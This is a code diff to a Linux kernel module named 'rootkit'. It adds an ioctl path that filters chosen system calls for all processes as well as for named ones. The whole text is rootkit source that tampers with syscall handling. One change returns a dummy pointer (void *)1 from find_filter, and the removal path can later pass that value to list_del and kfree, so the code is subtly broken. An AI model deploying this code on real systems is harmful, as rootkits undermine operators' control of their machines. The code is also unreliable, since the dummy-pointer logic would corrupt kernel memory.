@@ -45,12 +45,30 @@ struct filter_entry {
     struct list_head list;  // kernel 專用的鏈結串列
 };
 
+// for global linked list
+struct global_filter_entry {
+    int syscall_nr;
+    struct list_head list;
+};
+
 static LIST_HEAD(filter_list);
+static LIST_HEAD(global_filter_list);
+
+static int is_syscall_globally_filtered(int syscall_nr) {
+    struct global_filter_entry *entry;
+    list_for_each_entry(entry, &global_filter_list, list) {
+        if (entry->syscall_nr == syscall_nr)
+            return 1;
+    }
+    return 0;
+}
 
 static struct filter_entry *find_filter(int syscall_nr, const char *comm) {
-    struct filter_entry *entry;
+    if (is_syscall_globally_filtered(syscall_nr)) {
+        return (void *)1;  // Dummy non-NULL value to indicate filter matched
+    }
 
-    // 遍歷自訂的 filter_list 串列
+    struct filter_entry *entry;
     list_for_each_entry(entry, &filter_list, list) {
         if (entry->syscall_nr == syscall_nr && !strncmp(entry->comm, comm, TASK_FILTER_LEN))
             return entry; // 找到匹配的 filter，返回該 filter 資訊
@@ -273,6 +291,17 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
             return -EFAULT;
         }
 
+        if (info.comm[0] == '\0') {
+            struct global_filter_entry *new_global = kmalloc(sizeof(*new_global), GFP_KERNEL);
+            if (!new_global) return -ENOMEM;
+    
+            new_global->syscall_nr = info.syscall_nr;
+            INIT_LIST_HEAD(&new_global->list);
+            list_add(&new_global->list, &global_filter_list);
+            printk(KERN_INFO "[rootkit] Added global filter: syscall %d (all processes)\n", info.syscall_nr);
+            break;
+        }
+    
         new_filter = kmalloc(sizeof(*new_filter), GFP_KERNEL);
         if (!new_filter) {
             printk(KERN_INFO "[rootkit] kmalloc failed\n");
@@ -298,8 +327,20 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long a
             return -EFAULT;
         }
         
-        existing_filter = find_filter(info.syscall_nr, info.comm);
+        if (info.comm[0] == '\0') {
+            struct global_filter_entry *entry, *tmp;
+            list_for_each_entry_safe(entry, tmp, &global_filter_list, list) {
+                if (entry->syscall_nr == info.syscall_nr) {
+                    list_del(&entry->list);
+                    kfree(entry);
+                    printk(KERN_INFO "[rootkit] Removed global filter: syscall %d (all processes)\n", info.syscall_nr);
+                    break;
+                }
+            }
+            break;
+        }
 
+        existing_filter = find_filter(info.syscall_nr, info.comm);
         if (existing_filter) {
             list_del(&existing_filter->list);
             kfree(existing_filter);
